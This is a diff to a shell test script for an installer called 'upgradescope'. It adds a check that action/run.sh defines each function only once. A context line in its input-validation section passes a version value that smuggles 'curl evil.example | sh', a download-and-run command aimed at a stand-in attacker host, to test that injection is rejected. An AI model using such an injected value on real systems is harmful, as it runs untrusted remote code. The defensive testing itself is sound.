@@ -358,6 +358,11 @@ hasnt() { if grep -qF -- "$3" "$2"; then fail "$1" "$2"; else ok "$1"; fi; }
 # installed_nothing: the last run put no binary on PATH.
 installed_nothing() { [ ! -e "$tmp/upgradescope-bin/upgradescope" ] && [ ! -s "$rt/path" ]; }
 
+# A function defined twice runs its last definition, and the first is dead
+# code a reader takes for the real one.
+dup=$(sed -n 's/^\([a-z_][a-z0-9_]*\)() {$/\1/p' action/run.sh | sort | uniq -d)
+[ -z "$dup" ] && ok "action/run.sh defines each function once" || fail "action/run.sh defines $dup more than once"
+
 # --- input validation -----------------------------------------------------
 
 run install "$work/stub-curl:" INPUT_VERSION='v1.0; curl evil.example | sh'
